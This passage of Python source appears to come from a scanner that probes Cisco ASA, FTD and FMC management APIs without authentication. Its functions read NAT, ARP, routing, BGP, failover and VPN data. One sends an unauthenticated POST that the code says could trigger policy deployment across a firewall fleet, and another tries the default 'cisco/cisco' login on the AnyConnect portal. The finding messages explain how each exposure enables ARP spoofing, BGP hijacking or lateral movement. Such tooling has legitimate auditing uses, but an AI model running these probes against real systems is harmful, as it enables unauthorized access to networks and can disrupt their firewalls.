                f'and key parameters. Leaks PKI infrastructure endpoints reachable '
                f'from the FMC management network. '
                f'Body excerpt: {body3[:300]}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_fmc_deployment_api(host, port=443, timeout=5.0):
    """Probe FMC deployment API for unauthenticated access to device management operations.

    Synthesized from: Chapter 12 — FMC deployment API controls policy push to all managed
    FTD devices. Unauthenticated read of job history leaks device identities and change
    windows; unauthenticated POST to deploymentrequests could trigger policy deployment
    across the managed fleet; unauthenticated device record read maps the full FTD inventory.

    Endpoints probed:
      GET  /api/fmc_config/v1/domain/{uuid}/deployment/jobhistories
      POST /api/fmc_config/v1/domain/{uuid}/deployment/deploymentrequests (empty JSON)
      GET  /api/fmc_config/v1/domain/{uuid}/devices/devicerecords
    """
    _DEFAULT_UUID = '0050568A-0000-0ed3-0000-000000000001'
    base = f'https://{host}:{port}'
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers={'Accept': 'application/json'})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read().decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            return e.code, ''
        except Exception:
            return None, ''

    def _post_empty(path):
        url = f'{base}{path}'
        data = b'{}'
        req = urllib.request.Request(
            url, data=data, method='POST',
            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read().decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, ''

    # Probe 1: Deployment job history without auth
    sc1, body1 = _get(
        f'/api/fmc_config/v1/domain/{_DEFAULT_UUID}/deployment/jobhistories'
    )
    if sc1 == 200 and len(body1) > 0:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'FMC_DEPLOY_HISTORY_READABLE',
            'detail': (
                f'FMC deployment job history at '
                f'{base}/api/fmc_config/v1/domain/{_DEFAULT_UUID}/deployment/jobhistories '
                f'returned HTTP 200 ({len(body1)} bytes) without authentication. '
                f'Deployment records expose managed device UUIDs, policy push timestamps, '
                f'success/failure status, and change windows — operational intelligence '
                f'for timing attacks or identifying policy gaps between deployments. '
                f'Body excerpt: {body1[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 2: POST deploymentrequests without auth — CRITICAL if not 401
    sc2, body2 = _post_empty(
        f'/api/fmc_config/v1/domain/{_DEFAULT_UUID}/deployment/deploymentrequests'
    )
    if sc2 is not None and sc2 != 401 and sc2 != 403:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'FMC_DEPLOY_UNAUTH',
            'detail': (
                f'FMC deployment request endpoint at '
                f'{base}/api/fmc_config/v1/domain/{_DEFAULT_UUID}/deployment/deploymentrequests '
                f'returned HTTP {sc2} (not 401/403) for unauthenticated POST with empty JSON. '
                f'Policy deployment to managed FTD fleet may be triggerable without auth — '
                f'could push blank/permissive ACP causing immediate macrosegmentation collapse '
                f'or trigger policy churn causing high-availability failover. '
                f'Response: {body2[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 3: Device records (inventory) without auth
    sc3, body3 = _get(
        f'/api/fmc_config/v1/domain/{_DEFAULT_UUID}/devices/devicerecords'
    )
    if sc3 == 200 and len(body3) > 0:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'FMC_DEVICE_INVENTORY_UNAUTH',
            'detail': (
                f'FMC device records at '
                f'{base}/api/fmc_config/v1/domain/{_DEFAULT_UUID}/devices/devicerecords '
                f'returned HTTP 200 ({len(body3)} bytes) without authentication. '
                f'Full FTD device inventory exposed — device names, UUIDs, IP addresses, '
                f'software versions, HA state, and assigned policy names. '
                f'Complete managed firewall fleet enumeration without credentials. '
                f'Body excerpt: {body3[:300]}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_asa_failover_info(host, port=443, timeout=5.0):
    """Probe ASA/FTD failover and clustering topology for unauthenticated disclosure.

    Synthesized from: Chapter 5 — Firewalls in Network Topology. Failover and
    clustering APIs expose Active/Standby state, split-brain conditions, cluster
    member IP inventory, and failover interface link status — operational topology
    intelligence that enables targeted disruption of HA pairs.

    Endpoints probed:
      GET /api/v1/monitoring/failover      — Active/Standby state disclosure
      GET /api/v1/cluster/members          — cluster member IP enumeration
      GET /api/v1/monitoring/interface     — failover interface link status
    """
    base = f'https://{host}:{port}'
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers={'Accept': 'application/json'})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, ''

    # Probe 1: Failover state
    sc1, body1 = _get('/api/v1/monitoring/failover')
    if sc1 == 200 and len(body1) > 0:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'FAILOVER_STATUS_UNAUTH',
            'detail': (
                f'ASA failover monitoring endpoint at {base}/api/v1/monitoring/failover '
                f'returned HTTP 200 ({len(body1)} bytes) without authentication. '
                f'Active/Standby state, failover reason, and last-failover timestamp disclosed. '
                f'Reveals which unit is primary target for disruption and failover trigger history. '
                f'Body excerpt: {body1[:300]}'
            ),
            'host': host,
            'port': port,
        })

        # Check for split-brain: both units reporting Active state
        try:
            data = json.loads(body1)
            state = ''
            if isinstance(data, dict):
                state = str(data.get('state', '') or data.get('failoverState', '')).lower()
            if 'active' in state:
                # Attempt to probe peer or check items list for dual-active
                items = data.get('items', [])
                active_count = sum(
                    1 for item in items
                    if 'active' in str(item.get('state', '')).lower()
                )
                if active_count >= 2:
                    findings.append({
                        'severity': 'CRITICAL',
                        'title': 'SPLIT_BRAIN_FAILOVER',
                        'detail': (
                            f'ASA failover response at {base}/api/v1/monitoring/failover '
                            f'shows {active_count} units in Active state simultaneously — '
                            f'split-brain condition. Both units processing traffic independently; '
                            f'asymmetric policy enforcement, duplicate NATed sessions, '
                            f'and inconsistent connection tables. '
                            f'Body excerpt: {body1[:300]}'
                        ),
                        'host': host,
                        'port': port,
                    })
        except Exception:
            pass

    # Probe 2: Cluster member topology
    sc2, body2 = _get('/api/v1/cluster/members')
    if sc2 == 200 and len(body2) > 0:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'CLUSTER_TOPOLOGY_READABLE',
            'detail': (
                f'ASA cluster members endpoint at {base}/api/v1/cluster/members '
                f'returned HTTP 200 ({len(body2)} bytes) without authentication. '
                f'Full cluster unit inventory exposed — member IPs, unit names, roles, '
                f'and join state. Enables targeted per-unit attack sequencing to '
                f'progressively degrade cluster capacity without triggering bulk failover. '
                f'Body excerpt: {body2[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 3: Failover interface link status
    sc3, body3 = _get('/api/v1/monitoring/interface')
    if sc3 == 200 and len(body3) > 0:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'FAILOVER_INTERFACE_STATUS_READABLE',
            'detail': (
                f'ASA interface monitoring endpoint at {base}/api/v1/monitoring/interface '
                f'returned HTTP 200 ({len(body3)} bytes) without authentication. '
                f'Failover interface link state readable — identifies dedicated failover '
                f'link vs. LAN failover path, enabling targeted link disruption to '
                f'trigger uncontrolled failover. '
                f'Body excerpt: {body3[:300]}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_asa_nat_bypass(host, port=443, timeout=5.0):
    """Probe ASA/FTD NAT table endpoints for unauthenticated traversal surface disclosure.

    Synthesized from: Chapter 5 — Firewalls in Network Topology. NAT rule exposure
    reveals no-NAT destinations, identity NAT for RFC1918 ranges, and the full
    translation table — sufficient to reconstruct internal addressing and identify
    bypassed inspection zones.

    Endpoints probed:
      GET /api/v1/nat/auto-nat-rules      — automatic NAT table
      GET /api/v1/nat/manual-nat-rules    — manual NAT/twice-NAT rules
      GET /api/v1/nat/nat-exempt-rules    — no-NAT / NAT exemption rules
      GET /api/v1/objects/networkgroups   — network objects for identity NAT check
    """
    base = f'https://{host}:{port}'
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers={'Accept': 'application/json'})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, ''

    # Probe 1: Auto NAT rules
    sc1, body1 = _get('/api/v1/nat/auto-nat-rules')
    if sc1 == 200 and len(body1) > 0:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'AUTO_NAT_RULES_EXPOSED',
            'detail': (
                f'ASA auto-NAT rules at {base}/api/v1/nat/auto-nat-rules '
                f'returned HTTP 200 ({len(body1)} bytes) without authentication. '
                f'Full automatic NAT table readable — translated addresses, original '
                f'networks, interface pairs, and PAT pool configuration. '
                f'Exposes internal address space and translation topology; enables '
                f'crafting of packets that bypass stateful inspection via untranslated paths. '
                f'Body excerpt: {body1[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 2: Manual NAT rules
    sc2, body2 = _get('/api/v1/nat/manual-nat-rules')
    if sc2 == 200 and len(body2) > 0:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'MANUAL_NAT_RULES_EXPOSED',
            'detail': (
                f'ASA manual NAT rules at {base}/api/v1/nat/manual-nat-rules '
                f'returned HTTP 200 ({len(body2)} bytes) without authentication. '
                f'Manual (twice-NAT) rule set exposed — source/destination translation '
                f'pairs, interface zones, and policy-based NAT entries. '
                f'Twice-NAT rules reveal policy routing intent and internal segment topology '
                f'not visible from external network enumeration alone. '
                f'Body excerpt: {body2[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 3: NAT exempt rules
    sc3, body3 = _get('/api/v1/nat/nat-exempt-rules')
    if sc3 == 200 and len(body3) > 0:
        findings.append({
            'severity': 'HIGH',
            'title': 'NAT_EXEMPT_RULES_READABLE',
            'detail': (
                f'ASA NAT exemption rules at {base}/api/v1/nat/nat-exempt-rules '
                f'returned HTTP 200 ({len(body3)} bytes) without authentication. '
                f'No-NAT destination list disclosed — identifies traffic flows '
                f'exempted from address translation, typically VPN split-tunnel '
                f'or inter-zone trusted paths. These destinations receive packets '
                f'with original source addresses, bypassing NAT-based access controls. '
                f'Body excerpt: {body3[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 4: Network groups — check for RFC1918 identity NAT
    _RFC1918 = ('10.', '172.16.', '172.17.', '172.18.', '172.19.',
                '172.20.', '172.21.', '172.22.', '172.23.', '172.24.',
                '172.25.', '172.26.', '172.27.', '172.28.', '172.29.',
                '172.30.', '172.31.', '192.168.')
    sc4, body4 = _get('/api/v1/objects/networkgroups')
    if sc4 == 200 and len(body4) > 0:
        try:
            data = json.loads(body4)
            items = data if isinstance(data, list) else data.get('items', [])
            identity_hits = []
            for item in items:
                name = item.get('name', '')
                value = item.get('value', '') or item.get('network', '')
                if any(value.startswith(prefix) for prefix in _RFC1918):
                    identity_hits.append(f'{name}={value}')
            if identity_hits:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'IDENTITY_NAT_DETECTED',
                    'detail': (
                        f'ASA network groups at {base}/api/v1/objects/networkgroups '
                        f'returned HTTP 200 with RFC1918 network objects that may '
                        f'indicate identity NAT (no-translate) configuration: '
                        f'{", ".join(identity_hits[:10])}. '
                        f'Identity NAT for private ranges signals trusted inter-zone '
                        f'paths where packets traverse the firewall untranslated — '
                        f'a prerequisite for asymmetric routing exploitation.'
                    ),
                    'host': host,
                    'port': port,
                })
        except Exception:
            pass

    return findings


def probe_transparent_mode(host, port=80, timeout=5.0):
    """Probe ASA for transparent (Layer 2) firewall mode and associated bypass conditions.

    Synthesized from: Chapter 5 — Firewalls in Network Topology. Transparent mode
    places the ASA inline as an L2 bridge — no IP routing, invisible to traceroute.
    ARP inspection absence allows MAC spoofing to redirect bridged traffic; static
    ARP entries reveal internal host mapping without L3 enumeration.

    Endpoints probed:
      GET /api/v1/firewall/mode           — routed vs transparent mode detection
      GET /api/v1/firewall/arp            — ARP table (static entries = topology map)
    Port defaults to 80: transparent-mode ASAs often expose management on HTTP
    since they hold no routed IP on the bridged interface.
    """
    base = f'http://{host}:{port}'
    findings = []

    def _get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers={'Accept': 'application/json'})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, ''

    # Also try HTTPS fallback for firewall/mode
    def _get_https(path):
        import ssl as _ssl
        base_s = f'https://{host}:443'
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        url = f'{base_s}{path}'
        req = urllib.request.Request(url, headers={'Accept': 'application/json'})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, ''

    # Probe 1: Firewall mode
    sc1, body1 = _get('/api/v1/firewall/mode')
    if sc1 is None:
        sc1, body1 = _get_https('/api/v1/firewall/mode')
    if sc1 == 200 and len(body1) > 0:
        mode_lower = body1.lower()
        if 'transparent' in mode_lower:
            findings.append({
                'severity': 'HIGH',
                'title': 'TRANSPARENT_MODE_ACTIVE',
                'detail': (
                    f'ASA firewall mode endpoint at {host}/api/v1/firewall/mode '
                    f'returned HTTP 200 confirming transparent (Layer 2) mode. '
                    f'Transparent ASA acts as an inline L2 bridge — invisible to '
                    f'traceroute, no IP routing hop. ARP spoofing, MAC flooding, '
                    f'and VLAN hopping attacks bypass L3-only security controls. '
                    f'ARP inspection, DHCP snooping, and DAI must be verified separately. '
                    f'Body excerpt: {body1[:300]}'
                ),
                'host': host,
                'port': port,
            })
        elif sc1 == 200:
            # Mode readable but not transparent — still an info disclosure
            findings.append({
                'severity': 'MEDIUM',
                'title': 'FIREWALL_MODE_READABLE',
                'detail': (
                    f'ASA firewall mode at {host}/api/v1/firewall/mode returned '
                    f'HTTP 200 without authentication. Mode value disclosed: {body1[:100]}. '
                    f'Confirms routed mode and removes ambiguity for topology mapping.'
                ),
                'host': host,
                'port': port,
            })

    # Probe 2: ARP table
    sc2, body2 = _get('/api/v1/firewall/arp')
    if sc2 is None:
        sc2, body2 = _get_https('/api/v1/firewall/arp')
    if sc2 == 200 and len(body2) > 0:
        # Check for static ARP entries
        static_count = body2.lower().count('"static"') + body2.lower().count("'static'")
        severity = 'MEDIUM'
        static_note = (
            f'{static_count} static ARP entries detected — '
            if static_count > 0
            else 'ARP table content readable — '
        )
        findings.append({
            'severity': severity,
            'title': 'STATIC_ARP_ENTRIES_READABLE',
            'detail': (
                f'ASA ARP table at {host}/api/v1/firewall/arp '
                f'returned HTTP 200 ({len(body2)} bytes) without authentication. '
                f'{static_note}MAC-to-IP mappings for bridged hosts disclosed. '
                f'In transparent mode, static ARP entries pin host identity and '
                f'enable precise MAC spoofing to impersonate specific endpoints '
                f'without triggering dynamic ARP inspection. '
                f'Body excerpt: {body2[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 3: ARP inspection absence — simulated via HTTP OPTIONS probe
    # Real L2 MAC mismatch testing requires raw socket access not available here;
    # instead probe the ARP inspection config endpoint as a proxy signal.
    sc3, body3 = _get('/api/v1/firewall/arp-inspection')
    if sc3 is None:
        sc3, body3 = _get_https('/api/v1/firewall/arp-inspection')
    if sc3 == 200 and len(body3) > 0:
        if 'false' in body3.lower() or '"enabled":false' in body3.lower() or 'disabled' in body3.lower():
            findings.append({
                'severity': 'HIGH',
                'title': 'ARP_INSPECTION_ABSENT',
                'detail': (
                    f'ASA ARP inspection config at {host}/api/v1/firewall/arp-inspection '
                    f'returned HTTP 200 with inspection disabled. '
                    f'Without dynamic ARP inspection, transparent-mode ASA accepts '
                    f'gratuitous ARPs — MAC spoofing redirects bridged traffic through '
                    f'attacker host transparently. All L2 segments behind the firewall '
                    f'are ARP-poisoning targets. '
                    f'Body excerpt: {body3[:200]}'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_asa_routing_info(host, port=443, timeout=5.0):
    """Probe ASA/FTD routing and VRF APIs for unauthenticated topology disclosure.

    Synthesized from: Chapter 5 — Firewalls in Network Topology. Routing table and
    VRF exposure enables full network topology reconstruction — VRF segmentation
    boundaries, OSPF adjacency lists, BGP peer relationships, and the complete
    routing table provide a map sufficient for lateral movement path planning and
    segmentation bypass identification.

    Endpoints probed:
      GET /api/v1/routing/virtualrouter   — VRF/VPN routing instance enumeration
      GET /api/v1/routing/ospf            — OSPF process and neighbor config
      GET /api/v1/routing/bgp             — BGP AS and peer disclosure
      GET /api/v1/routing/route           — full RIB (routing information base)
    """
    base = f'https://{host}:{port}'
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers={'Accept': 'application/json'})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, ''

    # Probe 1: Virtual router / VRF table
    sc1, body1 = _get('/api/v1/routing/virtualrouter')
    if sc1 == 200 and len(body1) > 0:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'VRF_TABLE_READABLE',
            'detail': (
                f'ASA virtual router (VRF) endpoint at {base}/api/v1/routing/virtualrouter '
                f'returned HTTP 200 ({len(body1)} bytes) without authentication. '
                f'Full VRF topology disclosed — routing instance names, associated '
                f'interfaces, and inter-VRF route leaking policy. '
                f'VRF boundary enumeration identifies segmentation targets and '
                f'reveals route-leak misconfigurations enabling cross-segment access. '
                f'Body excerpt: {body1[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 2: OSPF configuration
    sc2, body2 = _get('/api/v1/routing/ospf')
    if sc2 == 200 and len(body2) > 0:
        findings.append({
            'severity': 'HIGH',
            'title': 'OSPF_CONFIG_READABLE',
            'detail': (
                f'ASA OSPF configuration at {base}/api/v1/routing/ospf '
                f'returned HTTP 200 ({len(body2)} bytes) without authentication. '
                f'OSPF process ID, area assignments, neighbor adjacencies, and '
                f'authentication type (MD5/plaintext/none) exposed. '
                f'Neighbor list enables OSPF injection attacks; auth type disclosure '
                f'determines feasibility of unauthorized routing advertisement injection. '
                f'Body excerpt: {body2[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 3: BGP configuration
    sc3, body3 = _get('/api/v1/routing/bgp')
    if sc3 == 200 and len(body3) > 0:
        findings.append({
            'severity': 'HIGH',
            'title': 'BGP_CONFIG_READABLE',
            'detail': (
                f'ASA BGP configuration at {base}/api/v1/routing/bgp '
                f'returned HTTP 200 ({len(body3)} bytes) without authentication. '
                f'BGP AS number, peer IP addresses, peer AS numbers, and '
                f'update-source interfaces disclosed. '
                f'Peer list enables BGP hijacking targeting (session reset, '
                f'prefix injection); AS disclosure maps upstream provider topology. '
                f'Body excerpt: {body3[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 4: Full routing table (RIB)
    sc4, body4 = _get('/api/v1/routing/route')
    if sc4 == 200 and len(body4) > 0:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'FULL_ROUTING_TABLE_READABLE',
            'detail': (
                f'ASA routing table at {base}/api/v1/routing/route '
                f'returned HTTP 200 ({len(body4)} bytes) without authentication. '
                f'Complete RIB exposed — all known prefixes, next-hops, administrative '
                f'distance, and route source (OSPF/BGP/static/connected). '
                f'Full internal network topology reconstructible from routing data alone; '
                f'sufficient to plan lateral movement paths, identify stub segments, '
                f'and locate next-hops for asymmetric routing exploitation. '
                f'Body excerpt: {body4[:300]}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_asa_vpn_config(host, port=443, timeout=5.0):
    """Probe ASA VPN portal and AnyConnect endpoint exposure.

    Synthesized from: Chapter 22 — Clientless Remote-Access SSL VPNs;
    Chapter 23 — Client-Based Remote-Access SSL VPNs (Cisco AnyConnect).
    AnyConnect portal at /+CSCOE+/ and clientless WebVPN at /+webvpn+/ are
    the primary remote-access attack surfaces on Cisco ASA. Default credentials
    (cisco/cisco) are a factory-shipped risk on unconfigured deployments;
    package listing at /IPSEC/AnyConnect/ reveals client version enabling
    targeted client-side exploit selection.

    Endpoints probed:
      GET /+CSCOE+/logon.html       — AnyConnect/WebVPN portal exposure
      GET /+webvpn+/index.html      — clientless WebVPN portal
      POST /+CSCOE+/logon.html      — default credential test (cisco/cisco)
      GET /IPSEC/AnyConnect/        — AnyConnect package directory listing
      GET /+CSCOE+/win.js           — client-side VPN config (JS bundle)
      GET /+CSCOE+/app.js           — client-side VPN config (app bundle)
    """
    findings = []
    base = f'https://{host}:{port}'

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers={
            'User-Agent': 'AnyConnect Darwin_/macOS',
            'Accept': 'text/html,application/xhtml+xml,*/*',
        })
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(8192).decode('utf-8', errors='replace')
                return r.status, body, dict(r.headers)
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096).decode('utf-8', errors='replace')
            except Exception:
                body = ''
            return e.code, body, dict(e.headers)
        except Exception:
            return None, '', {}

    def _post_form(path, data):
        url = f'{base}{path}'
        body_bytes = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(
            url,
            data=body_bytes,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'AnyConnect Darwin_/macOS',
                'Accept': 'text/html,application/xhtml+xml,*/*',
            },
            method='POST',
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(8192).decode('utf-8', errors='replace')
                hdrs = dict(r.headers)
                ck = {}
                for sc in (r.headers.get_all('Set-Cookie') or []):
                    parts = sc.split(';')[0].strip().split('=', 1)
                    if len(parts) == 2:
                        ck[parts[0]] = parts[1]
                return r.status, body, hdrs, ck
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096).decode('utf-8', errors='replace')
            except Exception:
                body = ''
            hdrs = dict(e.headers)
            ck = {}
            for sc in (e.headers.get_all('Set-Cookie') or []):
                parts = sc.split(';')[0].strip().split('=', 1)
                if len(parts) == 2:
                    ck[parts[0]] = parts[1]
            return e.code, body, hdrs, ck
        except Exception:
            return None, '', {}, {}

    # Probe 1: AnyConnect/WebVPN logon portal
    sc1, body1, _ = _get('/+CSCOE+/logon.html')
    if sc1 == 200 and (
        'webvpn' in body1.lower()
        or 'anyconnect' in body1.lower()
        or 'logon' in body1.lower()
        or 'CSCOE' in body1
    ):
        findings.append({
            'severity': 'HIGH',
            'title': 'ANYCONNECT_PORTAL_EXPOSED',
            'detail': (
                f'AnyConnect/WebVPN logon portal at {base}/+CSCOE+/logon.html '
                f'returned HTTP 200 ({len(body1)} bytes) without authentication. '
                f'Portal exposure enables credential brute-force, group name enumeration '
                f'via error differentiation (valid group vs invalid group responses '
                f'differ in HTTP status and body), and SAML/external-IdP redirect '
                f'fingerprinting. Tunnel-group name list constructible from HTML form '
                f'drop-down or group-url probe. '
                f'Body excerpt: {body1[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 2: Clientless WebVPN portal
    sc2, body2, _ = _get('/+webvpn+/index.html')
    if sc2 == 200 and len(body2) > 0:
        findings.append({
            'severity': 'HIGH',
            'title': 'CLIENTLESS_WEBVPN_EXPOSED',
            'detail': (
                f'Clientless WebVPN portal at {base}/+webvpn+/index.html '
                f'returned HTTP 200 ({len(body2)} bytes) without authentication. '
                f'Clientless WebVPN exposes internal web application proxying, '
                f'file-share browse (CIFS/SMB over SSL), and OWA/Citrix bookmark '
                f'enumeration without requiring AnyConnect client install. '
                f'Portal reachability confirms SSL VPN licensing is active and '
                f'remote-access is enabled on this interface. '
                f'Body excerpt: {body2[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 3: Default credential test (cisco/cisco)
    sc3, body3, hdrs3, ck3 = _post_form('/+CSCOE+/logon.html', {
        'username': 'cisco',
        'password': 'cisco',
        'Login': 'Logon',
        'tgroup': '',
    })
    login_success = False
    if sc3 in (200, 302):
        if (
            'webvpncontext' in ck3
            or 'webvpncontext' in hdrs3.get('Set-Cookie', '')
            or '/+CSCOE+/portal.html' in hdrs3.get('Location', '')
            or (
                sc3 == 200
                and 'error' not in body3.lower()
                and 'failed' not in body3.lower()
                and 'invalid' not in body3.lower()
                and len(body3) > 200
            )
        ):
            login_success = True
    if login_success:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ANYCONNECT_DEFAULT_CREDS',
            'detail': (
                f'AnyConnect/WebVPN logon at {base}/+CSCOE+/logon.html accepted '
                f'default credentials cisco/cisco (HTTP {sc3}). '
                f'Successful authentication grants full SSL VPN tunnel access to '
                f'internal network segments mapped to the default group policy. '
                f'Session cookie present: {"webvpncontext" in ck3}. '
                f'Location header: {hdrs3.get("Location", "none")}.'
            ),
            'host': host,
            'port': port,
        })

    # Probe 4: AnyConnect package directory listing
    sc4, body4, _ = _get('/IPSEC/AnyConnect/')
    if sc4 == 200 and (
        'anyconnect' in body4.lower()
        or '.pkg' in body4.lower()
        or 'Index of' in body4
    ):
        findings.append({
            'severity': 'HIGH',
            'title': 'ANYCONNECT_PACKAGE_EXPOSED',
            'detail': (
                f'AnyConnect package directory at {base}/IPSEC/AnyConnect/ '
                f'returned HTTP 200 ({len(body4)} bytes) without authentication. '
                f'Package listing reveals exact AnyConnect client version in use, '
                f'enabling targeted selection of known client-side vulnerabilities '
                f'(memory corruption, privilege escalation during install) and '
                f'direct .pkg download for offline analysis. '
                f'Body excerpt: {body4[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 5: Client-side VPN config JS bundles (/+CSCOE+/win.js then app.js)
    for js_path in ('/+CSCOE+/win.js', '/+CSCOE+/app.js'):
        sc5, body5, _ = _get(js_path)
        if sc5 == 200 and len(body5) > 0:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'ANYCONNECT_CLIENT_CONFIG',
                'detail': (
                    f'AnyConnect client-side JS bundle at {base}{js_path} '
                    f'returned HTTP 200 ({len(body5)} bytes) without authentication. '
                    f'JS bundles may contain tunnel-group names, connection profile '
                    f'URLs, SAML endpoint references, and split-tunnel ACL identifiers '
                    f'useful for VPN profile enumeration and group-name brute-force '
                    f'target list construction. '
                    f'Body excerpt: {body5[:200]}'
                ),
                'host': host,
                'port': port,
            })
            break

    return findings


def probe_asa_group_policy(host, port=443, timeout=5.0):
    """Probe ASA admin exec interface for unauthenticated VPN policy disclosure.

    Synthesized from: Chapter 19 — Site-to-Site IPsec VPNs; Chapter 20 — IPsec
    Remote-Access VPNs. The ASA ASDM/REST exec interface at /admin/exec/ exposes
    show commands directly over HTTPS. Unauthenticated access to show vpn-sessiondb,
    show crypto isakmp/ipsec sa, show group-policy, and show run tunnel-group
    discloses active VPN sessions with peer IPs, IKE SA state, IPsec SA transform
    sets, group policy inheritance chains, and tunnel-group preshared keys —
    sufficient to enumerate all VPN peers, reconstruct policy inheritance, and
    scope credential brute-force attacks.

    Endpoints probed:
      GET /admin/exec/show+vpn-sessiondb     — active VPN session database
      POST /admin/exec/show+group-policy     — group policy attribute dump
      GET /admin/exec/show+crypto+isakmp+sa  — IKE Phase 1 SA enumeration
      GET /admin/exec/show+crypto+ipsec+sa   — IPsec Phase 2 SA details
      GET /admin/exec/show+run+tunnel-group  — tunnel-group config + PSKs
    """
    findings = []
    base = f'https://{host}:{port}'

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers={
            'Accept': 'text/plain, text/html, */*',
        })
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(16384).decode('utf-8', errors='replace')
                return r.status, body, dict(r.headers)
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096).decode('utf-8', errors='replace')
            except Exception:
                body = ''
            return e.code, body, dict(e.headers)
        except Exception:
            return None, '', {}

    def _post_exec(path, token=None):
        url = f'{base}{path}'
        hdrs = {
            'Accept': 'text/plain, text/html, */*',
            'Content-Length': '0',
        }
        if token:
            hdrs['X-Auth-Token'] = token
        req = urllib.request.Request(url, data=b'', headers=hdrs, method='POST')
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(16384).decode('utf-8', errors='replace')
                return r.status, body
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096).decode('utf-8', errors='replace')
            except Exception:
                body = ''
            return e.code, body
        except Exception:
            return None, ''

    # Probe 1: VPN session database (show vpn-sessiondb)
